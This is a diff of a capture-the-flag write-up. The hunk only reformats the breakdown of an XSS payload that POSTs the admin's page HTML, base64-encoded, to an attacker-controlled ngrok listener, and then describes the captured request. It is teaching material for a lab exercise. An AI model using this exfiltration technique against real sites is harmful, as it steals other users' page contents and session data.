@@ -159,16 +159,16 @@ Hmm, ok. I can't become the admin, but can I at least steal the admin's page con
 
 ```
 ## Payload breakdown
-> 'https:://astir-....dev' is our "listener" URL(public address provided by ngrok)
-> method: 'POST' (if we tried to use 'GET', the response would have been cut off because URLs have a maximum length)
-> body : where we specify what data to send
-> document.documentElement.outerHTML : gets everything inside the html, including the tag itself
+`'https:://astir-....dev'` is our "listener" URL(public address provided by ngrok)
+`method: 'POST'` (if we tried to use 'GET', the response would have been cut off because URLs have a maximum length)
+`body` : where we specify what data to send
+`document.documentElement.outerHTML` : gets everything inside the html, including the tag itself
 This command "copies" the entire HTML source code of the page
 the admin is looking at
-> btoa(...) : converts from binary to ASCII and encodes the HTML into Base64
-
+`btoa(...)` : converts from binary to ASCII and encodes the HTML into Base64
 
 [!flag.jpg](img/flag.jpg)
+
 This is a screenshot from the `ngrok` web interface (http://127.0.0.1:4040). 
 
 `POST /` = the admin's browser sent a POST request to my ngrok server
